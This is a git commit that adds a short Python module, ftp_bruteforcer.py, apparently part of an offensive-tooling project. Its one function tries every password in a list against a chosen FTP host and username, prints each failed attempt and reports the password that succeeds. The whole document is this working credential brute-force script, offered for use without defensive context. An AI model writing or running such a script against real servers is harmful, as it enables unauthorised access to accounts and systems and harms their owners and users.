f7dd74c87752e9d00175f444926576d2e9504ab0
Yashvardhan Singh <chanchalyashsingh2005@gmail.com>
2025-07-19 21:03:00 +0530

    Create ftp_bruteforcer.py

---
+++ modules/ftp_bruteforcer.py
@@ -0,0 +1,12 @@
+from ftplib import FTP
+
+def ftp_brute_force(host, username, password_list):
+    for password in password_list:
+        try:
+            ftp = FTP(host)
+            ftp.login(user=username, passwd=password)
+            print(f"[+] Password Found: {password}")
+            ftp.quit()
+            return
+        except:
+            print(f"[-] Failed: {password}")
